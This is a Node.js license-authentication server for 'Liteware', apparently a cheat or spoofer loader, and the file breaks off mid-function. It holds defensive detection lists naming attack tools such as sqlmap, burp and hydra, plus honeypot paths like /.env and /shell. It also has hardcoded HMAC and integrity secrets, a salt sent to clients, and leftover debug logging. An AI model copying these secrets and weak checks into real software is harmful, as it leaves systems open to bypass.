// Liteware Advanced Authentication Server
// Install dependencies: npm install express body-parser crypto cors
// SECURITY: This server implements military-grade protection

const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const app = express();

// ========================================
// CORS CONFIGURATION (Allow browser requests)
// ========================================
app.use((req, res, next) => {
    // Allow requests from any origin (for local file:// and web access)
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Max-Age', '86400'); // 24 hours
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ========================================
// ANTI-CRACKER DETECTION SYSTEM
// ========================================

// Known cracking tool signatures and patterns
const CRACKER_SIGNATURES = {
    userAgents: [
        /postman/i, /insomnia/i, /curl/i, /wget/i, /httpie/i,
        /python-requests/i, /axios/i, /node-fetch/i, /got/i,
        /charles/i, /fiddler/i, /burp/i, /mitmproxy/i, /proxyman/i,
        /wireshark/i, /telerik/i, /owasp/i, /zap/i, /nikto/i,
        /sqlmap/i, /nmap/i, /masscan/i, /hydra/i, /medusa/i
    ],
    suspiciousHeaders: [
        'x-forwarded-for', 'x-real-ip', 'x-originating-ip',
        'x-remote-ip', 'x-client-ip', 'via', 'forwarded'
    ],
    vpnProviders: [
        'nordvpn', 'expressvpn', 'surfshark', 'cyberghost', 'pia',
        'mullvad', 'protonvpn', 'windscribe', 'tunnelbear', 'hotspot'
    ]
};

// Behavioral analysis storage
const behaviorAnalysis = new Map();
const suspiciousPatterns = new Map();
const honeypotTriggers = new Set();
const crackerFingerprints = new Set();

// Advanced detection functions
function detectCrackingAttempt(req) {
    const indicators = [];
    const ip = req.ip || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    
    // 1. Check for cracking tool user agents
    for (const pattern of CRACKER_SIGNATURES.userAgents) {
        if (pattern.test(ua)) {
            indicators.push({ type: 'CRACKING_TOOL', detail: pattern.toString() });
        }
    }
    
    // 2. Check for missing or suspicious headers
    if (!ua || ua.length < 20) {
        indicators.push({ type: 'MISSING_UA', detail: 'No or short user agent' });
    }
    
    // 3. Check for proxy/VPN headers
    for (const header of CRACKER_SIGNATURES.suspiciousHeaders) {
        if (req.headers[header]) {
            indicators.push({ type: 'PROXY_DETECTED', detail: header });
        }
    }
    
    // 4. Check request timing anomalies
    const behavior = behaviorAnalysis.get(ip) || { requests: [], lastTime: 0 };
    const now = Date.now();
    const timeDiff = now - behavior.lastTime;
    
    // Bot detection: requests too fast or too regular
    if (timeDiff > 0 && timeDiff < 50) {
        indicators.push({ type: 'BOT_SPEED', detail: `${timeDiff}ms between requests` });
    }
    
    // 5. Check for identical request patterns (replay/automation)
    const requestHash = crypto.createHash('md5')
        .update(JSON.stringify(req.body) + req.path)
        .digest('hex');
    
    if (behavior.requests.includes(requestHash)) {
        indicators.push({ type: 'REPLAY_DETECTED', detail: 'Duplicate request pattern' });
    }
    
    // Update behavior tracking
    behavior.requests.push(requestHash);
    if (behavior.requests.length > 20) behavior.requests.shift();
    behavior.lastTime = now;
    behaviorAnalysis.set(ip, behavior);
    
    // 6. Check for honeypot triggers
    if (honeypotTriggers.has(ip)) {
        indicators.push({ type: 'HONEYPOT_TRIGGERED', detail: 'Previously hit honeypot' });
    }
    
    // 7. Check fingerprint blacklist
    const fingerprint = generateClientFingerprint(req);
    if (crackerFingerprints.has(fingerprint)) {
        indicators.push({ type: 'KNOWN_CRACKER', detail: 'Fingerprint blacklisted' });
    }
    
    return indicators;
}

function generateClientFingerprint(req) {
    const data = [
        req.headers['user-agent'] || '',
        req.headers['accept-language'] || '',
        req.headers['accept-encoding'] || '',
        req.headers['accept'] || '',
        req.ip || req.connection.remoteAddress
    ].join('|');
    return crypto.createHash('sha256').update(data).digest('hex').substring(0, 32);
}

// Request integrity verification
function verifyRequestIntegrity(req) {
    const body = req.body;
    
    // Check for required security fields
    if (!body._timestamp || !body._nonce) {
        return { valid: false, reason: 'Missing security fields' };
    }
    
    // Check timestamp freshness (5 minute window)
    const age = Date.now() - body._timestamp;
    if (age < -30000 || age > 300000) {
        return { valid: false, reason: 'Request expired or future-dated' };
    }
    
    // Check for replay attack
    const requestId = `${body._nonce}-${body._timestamp}`;
    if (requestSignatures.has(requestId)) {
        return { valid: false, reason: 'Replay attack detected' };
    }
    requestSignatures.add(requestId);
    
    // Clean old signatures
    setTimeout(() => requestSignatures.delete(requestId), 300000);
    
    // Verify HMAC if provided
    if (body._signature) {
        const dataToSign = JSON.stringify({ ...body, _signature: undefined }) + body._timestamp + body._nonce;
        const expectedSig = crypto.createHmac('sha512', HMAC_SECRET)
            .update(dataToSign)
            .digest('hex');
        
        // Use timing-safe comparison
        if (body._signature.length !== expectedSig.length) {
            return { valid: false, reason: 'Signature length mismatch' };
        }
        
        try {
            if (!crypto.timingSafeEqual(Buffer.from(body._signature, 'hex'), Buffer.from(expectedSig, 'hex'))) {
                return { valid: false, reason: 'Invalid signature' };
            }
        } catch (e) {
            // If signature isn't valid hex, reject
            return { valid: false, reason: 'Malformed signature' };
        }
    }
    
    return { valid: true };
}

// Advanced rate limiting with behavior analysis
function advancedRateLimit(req, res, next) {
    // Skip rate limiting for admin endpoints (they use validateAppSecret)
    const path = req.path || req.url || '';
    if (path.includes('/auth/admin/') || path.startsWith('/auth/admin/')) {
        return next();
    }
    
    // #region agent log
    const fs = require('fs');
    const logPath = 'c:\\Users\\jay\\Downloads\\new liteware spoof\\.cursor\\debug.log';
    try {
        const logEntry = JSON.stringify({location:'auth-server-example.js:184',message:'advancedRateLimit entry',data:{path:path,method:req.method},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'}) + '\n';
        fs.appendFileSync(logPath, logEntry);
    } catch(e) {}
    // #endregion
    
    const ip = req.ip || req.connection.remoteAddress;
    
    // Check if IP is banned
    if (bannedIPs.has(ip)) {
        // #region agent log
        try {
            const logEntry = JSON.stringify({location:'auth-server-example.js:194',message:'IP banned in rate limiter',data:{ip:ip,path:path},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'}) + '\n';
            fs.appendFileSync(logPath, logEntry);
        } catch(e) {}
        // #endregion
        console.log(`🚫 Banned IP attempted access: ${ip}`);
        return res.status(403).json({ 
            success: false, 
            message: 'Access denied',
            code: 'BANNED'
        });
    }
    
    // Detect cracking attempts
    const crackIndicators = detectCrackingAttempt(req);
    if (crackIndicators.length >= 2) {
        console.log(`⚠️ Cracking attempt detected from ${ip}:`, crackIndicators);
        
        // Track suspicious activity
        const suspicion = suspiciousPatterns.get(ip) || { count: 0, indicators: [] };
        suspicion.count += crackIndicators.length;
        suspicion.indicators.push(...crackIndicators);
        suspiciousPatterns.set(ip, suspicion);
        
        // Auto-ban after threshold
        if (suspicion.count >= 10) {
            bannedIPs.add(ip);
            console.log(`🔨 Auto-banned cracker IP: ${ip}`);
            
            // Log to crack attempts
            crackAttemptLogs.push({
                timestamp: Date.now(),
                ip,
                reason: 'Auto-banned: Cracking tools detected',
                indicators: crackIndicators
            });
            
            return res.status(403).json({
                success: false,
                message: 'Security violation detected',
                code: 'SECURITY_BAN'
            });
        }
    }
    
    // Standard rate limiting
    const now = Date.now();
    const windowStart = now - RATE_LIMIT_WINDOW;
    
    let requests = rateLimitStore.get(ip) || [];
    requests = requests.filter(time => time > windowStart);
    
    if (requests.length >= MAX_REQUESTS_PER_WINDOW) {
        console.log(`⏱️ Rate limited: ${ip}`);
        return res.status(429).json({
            success: false,
            message: 'Too many requests. Please wait.',
            code: 'RATE_LIMITED',
            retry_after: Math.ceil((requests[0] + RATE_LIMIT_WINDOW - now) / 1000)
        });
    }
    
    requests.push(now);
    rateLimitStore.set(ip, requests);
    
    next();
}

// ========================================
// HONEYPOT ENDPOINTS (Trap crackers)
// ========================================

const honeypotPaths = [
    '/admin', '/api/admin', '/auth/debug', '/auth/test',
    '/debug', '/test', '/config', '/env', '/settings',
    '/.env', '/wp-admin', '/phpinfo', '/info.php',
    '/api/v1/debug', '/api/v2/admin', '/backdoor',
    '/shell', '/cmd', '/exec', '/eval', '/system'
];

honeypotPaths.forEach(path => {
    app.all(path, (req, res) => {
        const ip = req.ip || req.connection.remoteAddress;
        console.log(`🍯 HONEYPOT TRIGGERED: ${ip} hit ${path}`);
        
        honeypotTriggers.add(ip);
        crackerFingerprints.add(generateClientFingerprint(req));
        
        crackAttemptLogs.push({
            timestamp: Date.now(),
            ip,
            reason: `Honeypot triggered: ${path}`,
            hwid: req.body?.hwid || 'unknown'
        });
        
        // Return fake success to waste their time
        setTimeout(() => {
            res.json({
                success: true,
                message: 'Debug mode enabled',
                admin_token: crypto.randomBytes(32).toString('hex'),
                secret_key: crypto.randomBytes(16).toString('hex')
            });
        }, 2000 + Math.random() * 3000);
    });
});

// ========================================
// ADVANCED SECURITY CONFIGURATION
// ========================================

// Rate limiting storage
const rateLimitStore = new Map();
const failedAttempts = new Map();
const bannedIPs = new Set();
const bannedHWIDs = new Set();
const activeSessions = new Map();
const requestSignatures = new Set(); // Prevent replay attacks
const serverStartTime = Date.now(); // Track server start time for uptime calculation
const crackAttemptLogs = [];

// Server state flags
let serverDisabled = false; // Server disable mode (blocks requests but keeps server running)
let maintenanceMode = false; // Maintenance mode flag
let loaderDisabled = false; // Loader disable flag

// Security constants
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 30;
const MAX_FAILED_ATTEMPTS = 5;
const BAN_DURATION = 3600000; // 1 hour
const SESSION_TIMEOUT = 300000; // 5 minutes
const HEARTBEAT_INTERVAL = 30000; // 30 seconds
const SIGNATURE_EXPIRY = 60000; // 1 minute for replay protection

// Encryption keys (rotate these regularly in production)
const SERVER_PRIVATE_KEY = crypto.randomBytes(32);
const HMAC_SECRET = crypto.createHash('sha256').update('LITEWARE_HMAC_2024_SECURE').digest();

// Apply advanced rate limiting to all routes
app.use(advancedRateLimit);

// ========================================
// ADVANCED ENCRYPTION FUNCTIONS
// ========================================

function generateSessionToken() {
    return crypto.randomBytes(64).toString('hex');
}

function generateNonce() {
    return crypto.randomBytes(16).toString('hex');
}

function encryptResponse(data, sessionKey) {
    try {
        const iv = crypto.randomBytes(16);
        const key = crypto.createHash('sha256').update(sessionKey).digest();
        const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();
        return {
            encrypted: true,
            iv: iv.toString('hex'),
            data: encrypted,
            tag: authTag.toString('hex'),
            timestamp: Date.now()
        };
    } catch (e) {
        return data; // Fallback to unencrypted
    }
}

function decryptRequest(encryptedData, sessionKey) {
    try {
        if (!encryptedData.encrypted) return encryptedData;
        const key = crypto.createHash('sha256').update(sessionKey).digest();
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(encryptedData.iv, 'hex'));
        decipher.setAuthTag(Buffer.from(encryptedData.tag, 'hex'));
        let decrypted = decipher.update(encryptedData.data, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (e) {
        return null;
    }
}

function createRequestSignature(data, timestamp, nonce) {
    const payload = JSON.stringify(data) + timestamp + nonce;
    return crypto.createHmac('sha512', HMAC_SECRET).update(payload).digest('hex');
}

function verifyRequestSignature(data, timestamp, nonce, signature) {
    // Check timestamp freshness (prevent replay attacks)
    const now = Date.now();
    if (Math.abs(now - timestamp) > SIGNATURE_EXPIRY) {
        return { valid: false, reason: 'Request expired' };
    }
    
    // Check if signature was already used (replay protection)
    const sigKey = `${signature}_${nonce}`;
    if (requestSignatures.has(sigKey)) {
        return { valid: false, reason: 'Replay attack detected' };
    }
    
    // Verify signature
    const expectedSig = createRequestSignature(data, timestamp, nonce);
    if (!crypto.timingSafeEqual(Buffer.from(signature, 'hex'), Buffer.from(expectedSig, 'hex'))) {
        return { valid: false, reason: 'Invalid signature' };
    }
    
    // Store signature to prevent replay
    requestSignatures.add(sigKey);
    setTimeout(() => requestSignatures.delete(sigKey), SIGNATURE_EXPIRY * 2);
    
    return { valid: true };
}

// ========================================
// RATE LIMITING & ANTI-BRUTE FORCE
// ========================================

function getRateLimitKey(req) {
    const ip = req.ip || req.connection.remoteAddress || 'unknown';
    const hwid = req.body.hwid || req.body.gpu_hash || '';
    return `${ip}_${hwid}`;
}

function checkRateLimit(req) {
    const key = getRateLimitKey(req);
    const ip = req.ip || req.connection.remoteAddress;
    
    // Check if IP is banned
    if (bannedIPs.has(ip)) {
        return { allowed: false, reason: 'IP temporarily banned', retryAfter: BAN_DURATION };
    }
    
    // Check if HWID is banned
    const hwid = req.body.hwid || req.body.gpu_hash;
    if (hwid && bannedHWIDs.has(hwid)) {
        return { allowed: false, reason: 'Device banned', retryAfter: BAN_DURATION };
    }
    
    const now = Date.now();
    const windowStart = now - RATE_LIMIT_WINDOW;
    
    // Get or create rate limit entry
    if (!rateLimitStore.has(key)) {
        rateLimitStore.set(key, []);
    }
    
    const requests = rateLimitStore.get(key);
    
    // Remove old requests outside window
    const validRequests = requests.filter(t => t > windowStart);
    rateLimitStore.set(key, validRequests);
    
    // Check if over limit
    if (validRequests.length >= MAX_REQUESTS_PER_WINDOW) {
        // Increment failed attempts
        const fails = (failedAttempts.get(ip) || 0) + 1;
        failedAttempts.set(ip, fails);
        
        // Ban if too many failures
        if (fails >= MAX_FAILED_ATTEMPTS) {
            bannedIPs.add(ip);
            setTimeout(() => bannedIPs.delete(ip), BAN_DURATION);
            console.log(`🚫 Banned IP for rate limit abuse: ${ip}`);
        }
        
        return { 
            allowed: false, 
            reason: 'Rate limit exceeded', 
            retryAfter: RATE_LIMIT_WINDOW,
            remaining: 0
        };
    }
    
    // Add current request
    validRequests.push(now);
    rateLimitStore.set(key, validRequests);
    
    return { 
        allowed: true, 
        remaining: MAX_REQUESTS_PER_WINDOW - validRequests.length 
    };
}

function recordFailedAttempt(req, reason) {
    const ip = req.ip || req.connection.remoteAddress;
    const hwid = req.body.hwid || req.body.gpu_hash;
    
    const fails = (failedAttempts.get(ip) || 0) + 1;
    failedAttempts.set(ip, fails);
    
    console.log(`⚠️ Failed attempt #${fails} from ${ip}: ${reason}`);
    
    if (fails >= MAX_FAILED_ATTEMPTS) {
        bannedIPs.add(ip);
        if (hwid) bannedHWIDs.add(hwid);
        setTimeout(() => {
            bannedIPs.delete(ip);
            if (hwid) bannedHWIDs.delete(hwid);
        }, BAN_DURATION);
        console.log(`🚫 Banned ${ip} and HWID ${hwid} for ${BAN_DURATION/1000}s`);
        return true; // Was banned
    }
    return false;
}

function clearFailedAttempts(req) {
    const ip = req.ip || req.connection.remoteAddress;
    failedAttempts.delete(ip);
}

// ========================================
// SESSION MANAGEMENT
// ========================================

function createSession(licenseKey, hwid, ip) {
    const sessionToken = generateSessionToken();
    const sessionKey = crypto.randomBytes(32).toString('hex');
    
    const session = {
        token: sessionToken,
        key: sessionKey,
        licenseKey,
        hwid,
        ip,
        createdAt: Date.now(),
        lastHeartbeat: Date.now(),
        heartbeatCount: 0
    };
    
    activeSessions.set(sessionToken, session);
    
    // Auto-expire session
    setTimeout(() => {
        if (activeSessions.has(sessionToken)) {
            const s = activeSessions.get(sessionToken);
            if (Date.now() - s.lastHeartbeat > SESSION_TIMEOUT) {
                activeSessions.delete(sessionToken);
                console.log(`🔒 Session expired: ${sessionToken.substring(0, 16)}...`);
            }
        }
    }, SESSION_TIMEOUT);
    
    return { token: sessionToken, key: sessionKey };
}

function validateSession(token) {
    if (!activeSessions.has(token)) {
        return { valid: false, reason: 'Invalid session' };
    }
    
    const session = activeSessions.get(token);
    
    // Check if session timed out
    if (Date.now() - session.lastHeartbeat > SESSION_TIMEOUT) {
        activeSessions.delete(token);
        return { valid: false, reason: 'Session expired' };
    }
    
    return { valid: true, session };
}

function updateHeartbeat(token) {
    if (activeSessions.has(token)) {
        const session = activeSessions.get(token);
        session.lastHeartbeat = Date.now();
        session.heartbeatCount++;
        activeSessions.set(token, session);
        return true;
    }
    return false;
}

// ========================================
// ANTI-TAMPER DETECTION
// ========================================

function detectSuspiciousRequest(req) {
    const suspicious = [];
    
    // Check for missing or suspicious headers
    const userAgent = req.headers['user-agent'] || '';
    if (!userAgent || userAgent.includes('curl') || userAgent.includes('wget') || userAgent.includes('python')) {
        suspicious.push('Suspicious user agent');
    }
    
    // Check for proxy/VPN indicators
    const proxyHeaders = ['x-forwarded-for', 'x-real-ip', 'via', 'forwarded'];
    for (const header of proxyHeaders) {
        if (req.headers[header]) {
            suspicious.push('Proxy detected');
            break;
        }
    }
    
    // Check for debugger indicators in request
    if (req.body) {
        const bodyStr = JSON.stringify(req.body).toLowerCase();
        const debugIndicators = ['debug', 'test', 'crack', 'bypass', 'hook', 'inject'];
        for (const indicator of debugIndicators) {
            if (bodyStr.includes(indicator)) {
                suspicious.push(`Suspicious keyword: ${indicator}`);
            }
        }
    }
    
    // Check request timing patterns (too fast = automated)
    const key = getRateLimitKey(req);
    const requests = rateLimitStore.get(key) || [];
    if (requests.length >= 2) {
        const lastTwo = requests.slice(-2);
        if (lastTwo[1] - lastTwo[0] < 100) { // Less than 100ms between requests
            suspicious.push('Automated request pattern');
        }
    }
    
    return suspicious;
}

// ========================================
// INTEGRITY VERIFICATION
// ========================================

function generateClientChallenge() {
    const challenge = crypto.randomBytes(32).toString('hex');
    const expectedResponse = crypto.createHash('sha256')
        .update(challenge + 'LITEWARE_INTEGRITY_2024')
        .digest('hex');
    return { challenge, expectedResponse };
}

function verifyClientIntegrity(challenge, response, expectedResponse) {
    try {
        return crypto.timingSafeEqual(
            Buffer.from(response, 'hex'),
            Buffer.from(expectedResponse, 'hex')
        );
    } catch {
        return false;
    }
}

// Clean up old data periodically
setInterval(() => {
    const now = Date.now();
    
    // Clean old rate limit entries
    for (const [key, requests] of rateLimitStore.entries()) {
        const valid = requests.filter(t => t > now - RATE_LIMIT_WINDOW);
        if (valid.length === 0) {
            rateLimitStore.delete(key);
        } else {
            rateLimitStore.set(key, valid);
        }
    }
    
    // Clean expired sessions
    for (const [token, session] of activeSessions.entries()) {
        if (now - session.lastHeartbeat > SESSION_TIMEOUT) {
            activeSessions.delete(token);
        }
    }
    
    console.log(`🧹 Cleanup: ${rateLimitStore.size} rate entries, ${activeSessions.size} sessions, ${bannedIPs.size} banned IPs`);
}, 60000); // Every minute

// Try to require multer, but handle if it's not installed
let multer = null;
let upload = null;
let uploadDir = null;

try {
    multer = require('multer');
    
    // Ensure upload directories exist
    uploadDir = path.join(__dirname, 'uploads', 'crack_screenshots');
    try {
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
    } catch (dirError) {
        console.error('Error creating upload directory:', dirError);
        // Use temp directory as fallback
        uploadDir = require('os').tmpdir();
    }
    
    // Configure multer for file uploads
    const storage = multer.diskStorage({
        destination: function (req, file, cb) {
            cb(null, uploadDir);
        },
        filename: function (req, file, cb) {
            const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
            cb(null, 'crack_' + uniqueSuffix + path.extname(file.originalname || '.png'));
        }
    });
    
    upload = multer({ 
        storage: storage,
        limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
    });
    
    console.log('Multer initialized successfully');
} catch (multerError) {
    console.error('Multer not available:', multerError.message);
    console.log('File uploads will be disabled. Install multer: npm install multer');
    // Server will continue without file upload support
}

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    
    next();
});

app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(bodyParser.json({ limit: '50mb' }));

// ========================================
// REQUEST INTEGRITY VERIFICATION MIDDLEWARE
// ========================================
app.use('/auth', (req, res, next) => {
    // Skip for OPTIONS
    if (req.method === 'OPTIONS') return next();
    
    // Skip for admin endpoints (they use validateAppSecret for auth)
    const path = req.path || req.url || '';
    if (path.includes('/auth/admin/') || path.startsWith('/auth/admin/')) {
        return next();
    }
    
    // Skip for certain safe endpoints
    const safeEndpoints = ['/auth/', '/auth/health'];
    if (safeEndpoints.includes(req.path)) return next();
    
    // Verify request has required body
    if (!req.body || typeof req.body !== 'object') {
        console.log(`⚠️ Invalid request body from ${req.ip}`);
        return res.status(400).json({ success: false, message: 'Invalid request' });
    }
    
    // Check for automation/bot indicators
    const ua = req.headers['user-agent'] || '';
    if (!ua || ua.length < 10) {
        console.log(`⚠️ Missing/short user-agent from ${req.ip}: "${ua}"`);
        // Don't block, but flag as suspicious
        req.suspicious = true;
    }
    
    // Check for known proxy headers (potential tampering)
    const proxyHeaders = ['x-forwarded-for', 'x-real-ip', 'via', 'forwarded'];
    for (const header of proxyHeaders) {
        if (req.headers[header]) {
            req.suspicious = true;
            req.proxyDetected = header;
        }
    }
    
    // Verify timestamp freshness (if provided)
    if (req.body._timestamp) {
        const age = Date.now() - req.body._timestamp;
        if (age < -60000 || age > 600000) { // Allow 1 min clock drift, 10 min max age
            console.log(`⚠️ Stale/future request from ${req.ip}: age=${age}ms`);
            return res.status(400).json({ success: false, message: 'Request expired', code: 'EXPIRED' });
        }
    }
    
    // Verify nonce uniqueness (replay protection)
    if (req.body._nonce) {
        const nonceKey = `${req.ip}-${req.body._nonce}`;
        if (requestSignatures.has(nonceKey)) {
            console.log(`🔄 Replay attack detected from ${req.ip}`);
            return res.status(400).json({ success: false, message: 'Replay detected', code: 'REPLAY' });
        }
        requestSignatures.add(nonceKey);
        // Clean up after 10 minutes
        setTimeout(() => requestSignatures.delete(nonceKey), 600000);
    }
    
    next();
});

// ========================================
// SECURITY MIDDLEWARE
// ========================================

// Rate limiting middleware
app.use('/auth', (req, res, next) => {
    // Skip rate limiting for certain endpoints
    const skipEndpoints = ['/auth/heartbeat', '/auth/loader-status'];
    if (skipEndpoints.some(e => req.path.startsWith(e))) {
        return next();
    }
    
    const rateCheck = checkRateLimit(req);
    if (!rateCheck.allowed) {
        console.log(`🚫 Rate limited: ${req.ip} - ${rateCheck.reason}`);
        return res.status(429).json({
            success: false,
            error: 'RATE_LIMITED',
            message: rateCheck.reason,
            retryAfter: rateCheck.retryAfter,
            ban_user: true // Tell client to show ban message
        });
    }
    
    // Add rate limit headers
    res.set('X-RateLimit-Remaining', rateCheck.remaining);
    res.set('X-RateLimit-Reset', Date.now() + RATE_LIMIT_WINDOW);
    
    next();
});

// Suspicious request detection middleware
app.use('/auth', (req, res, next) => {
    const suspicious = detectSuspiciousRequest(req);
    
    if (suspicious.length > 0) {
        console.log(`⚠️ Suspicious request from ${req.ip}: ${suspicious.join(', ')}`);
        
        // Log but don't block (could be false positive)
        // For strict mode, uncomment below:
        // if (suspicious.length >= 2) {
        //     recordFailedAttempt(req, 'Multiple suspicious indicators');
        //     return res.status(403).json({ success: false, error: 'FORBIDDEN' });
        // }
    }
    
    next();
});

// Server disable check middleware (must be before signature verification)
app.use('/auth', (req, res, next) => {
    // Allow enable-server and server-status endpoints even if server is disabled (to re-enable it)
    if (serverDisabled && req.path !== '/admin/enable-server' && req.path !== '/admin/server-status') {
        console.log('🚫 Request rejected - Server is disabled');
        return res.status(503).json({
            success: false,
            error: 'SERVER_DISABLED',
            message: 'Disabled by a LiteWare administrator'
        });
    }
    next();
});

// Request signature verification middleware (for signed requests)
app.use('/auth', (req, res, next) => {
    // Only verify if signature is provided (backwards compatible)
    if (req.body._signature && req.body._timestamp && req.body._nonce) {
        const { _signature, _timestamp, _nonce, ...data } = req.body;
        
        const verification = verifyRequestSignature(data, _timestamp, _nonce, _signature);
        if (!verification.valid) {
            console.log(`🚫 Invalid signature from ${req.ip}: ${verification.reason}`);
            recordFailedAttempt(req, verification.reason);
            return res.status(403).json({
                success: false,
                error: 'INVALID_SIGNATURE',
                message: verification.reason
            });
        }
        
        // Remove signature fields from body
        req.body = data;
    }
    
    next();
});

// ========================================
// SECURITY ENDPOINTS
// ========================================

// Heartbeat endpoint - client must call this every 30 seconds
app.post('/auth/heartbeat', (req, res) => {
    const { session_token, hwid } = req.body;
    
    if (!session_token) {
        return res.json({ success: false, error: 'NO_SESSION' });
    }
    
    const sessionCheck = validateSession(session_token);
    if (!sessionCheck.valid) {
        return res.json({ 
            success: false, 
            error: 'SESSION_INVALID',
            message: sessionCheck.reason,
            action: 'REAUTH' // Tell client to re-authenticate
        });
    }
    
    // Verify HWID matches session
    if (hwid && sessionCheck.session.hwid !== hwid) {
        console.log(`🚫 HWID mismatch in heartbeat: expected ${sessionCheck.session.hwid}, got ${hwid}`);
        activeSessions.delete(session_token);
        return res.json({
            success: false,
            error: 'HWID_MISMATCH',
            action: 'TERMINATE' // Critical security violation
        });
    }
    
    updateHeartbeat(session_token);
    
    // Generate new challenge for integrity check
    const challenge = generateClientChallenge();
    
    res.json({
        success: true,
        next_heartbeat: HEARTBEAT_INTERVAL,
        challenge: challenge.challenge,
        server_time: Date.now()
    });
});

// Session validation endpoint
app.post('/auth/validate-session', (req, res) => {
    const { session_token } = req.body;
    
    const sessionCheck = validateSession(session_token);
    res.json({
        success: sessionCheck.valid,
        error: sessionCheck.valid ? null : sessionCheck.reason,
        session_age: sessionCheck.valid ? Date.now() - sessionCheck.session.createdAt : null
    });
});

// Integrity challenge endpoint
app.post('/auth/challenge', validateAppSecret, (req, res) => {
    const challenge = generateClientChallenge();
    
    // Store challenge temporarily for verification
    const challengeId = crypto.randomBytes(16).toString('hex');
    const challengeData = {
        challenge: challenge.challenge,
        expectedResponse: challenge.expectedResponse,
        createdAt: Date.now()
    };
    
    // Store in memory (use Redis in production)
    if (!global.pendingChallenges) global.pendingChallenges = new Map();
    global.pendingChallenges.set(challengeId, challengeData);
    
    // Expire challenge after 30 seconds
    setTimeout(() => {
        if (global.pendingChallenges) {
            global.pendingChallenges.delete(challengeId);
        }
    }, 30000);
    
    res.json({
        success: true,
        challenge_id: challengeId,
        challenge: challenge.challenge,
        algorithm: 'SHA256',
        salt: 'LITEWARE_INTEGRITY_2024'
    });
});

// Verify challenge response
app.post('/auth/verify-challenge', validateAppSecret, (req, res) => {
    const { challenge_id, response } = req.body;
    
    if (!global.pendingChallenges || !global.pendingChallenges.has(challenge_id)) {
        recordFailedAttempt(req, 'Invalid or expired challenge');
        return res.json({
            success: false,
            error: 'CHALLENGE_EXPIRED',
            action: 'TERMINATE'
        });
    }
    
    const challengeData = global.pendingChallenges.get(challenge_id);
    global.pendingChallenges.delete(challenge_id);
    
    // Check if challenge is too old
    if (Date.now() - challengeData.createdAt > 30000) {
        recordFailedAttempt(req, 'Challenge timeout');
        return res.json({
            success: false,
            error: 'CHALLENGE_TIMEOUT',
            action: 'TERMINATE'
        });
    }
    
    // Verify response
    if (!verifyClientIntegrity(challengeData.challenge, response, challengeData.expectedResponse)) {
        recordFailedAttempt(req, 'Failed integrity check');
        console.log(`🚫 INTEGRITY CHECK FAILED from ${req.ip}`);
        return res.json({
            success: false,
            error: 'INTEGRITY_FAILED',
            action: 'TERMINATE' // Client is tampered
        });
    }
    
    res.json({
        success: true,
        verified: true
    });
});

// Get server public key for encrypted communication
app.get('/auth/public-key', (req, res) => {
    // In production, use proper asymmetric encryption
    const publicInfo = {
        algorithm: 'AES-256-GCM',
        keyExchange: 'ECDH',
        version: '2.0',
        timestamp: Date.now()
    };
    res.json(publicInfo);
});

// Code integrity hash verification endpoint
app.post('/auth/verify-integrity-hash', validateAppSecret, (req, res) => {
    const { integrity_hash, license_key } = req.body;
    
    if (!integrity_hash) {
        return res.json({
            success: false,
            error: 'INTEGRITY_HASH_REQUIRED'
        });
    }
    
    // Get expected hash for this license key (if stored)
    // In production, store expected hashes per license key
    const license = licenses[license_key];
    
    if (!license) {
        return res.json({
            success: false,
            error: 'INVALID_LICENSE'
        });
    }
    
    // Store integrity hash for this license (first time)
    if (!license.integrity_hash) {
        license.integrity_hash = integrity_hash;
        console.log(`✅ Stored integrity hash for license ${license_key.substring(0, 8)}...`);
    }
    
    // Verify hash matches expected
    if (license.integrity_hash && license.integrity_hash !== integrity_hash) {
        console.log(`🚫 INTEGRITY HASH MISMATCH for license ${license_key.substring(0, 8)}...`);
        recordFailedAttempt(req, 'Integrity hash mismatch - code may be patched');
        return res.json({
            success: false,
            error: 'INTEGRITY_HASH_MISMATCH',
            action: 'TERMINATE' // Code has been modified
        });
    }
    
    res.json({
        success: true,
        verified: true,
        hash_stored: !!license.integrity_hash
    });
});

// Initialize global crack attempts array
if (!global.crackAttempts) {
    global.crackAttempts = [];
    console.log('Initialized global.crackAttempts array');
}

// File-based persistence for crack logs
const CRACK_LOGS_FILE = path.join(__dirname, 'crack_logs.json');

// Load crack logs from file on startup
function loadCrackLogsFromFile() {
    try {
        if (fs.existsSync(CRACK_LOGS_FILE)) {
            const data = fs.readFileSync(CRACK_LOGS_FILE, 'utf8');
            if (data && data.trim().length > 0) {
                const logs = JSON.parse(data);
                if (Array.isArray(logs)) {
                    global.crackAttempts = logs;
                    console.log(`✅ Loaded ${logs.length} crack attempt logs from file`);
                    return;
                } else {
                    console.warn('⚠️ Log file exists but data is not an array. Initializing empty array.');
                }
            } else {
                console.warn('⚠️ Log file exists but is empty. Initializing empty array.');
            }
        } else {
            console.log('ℹ️ No existing log file found. Starting with empty array.');
        }
    } catch (error) {
        console.error('❌ Error loading crack logs from file:', error.message);
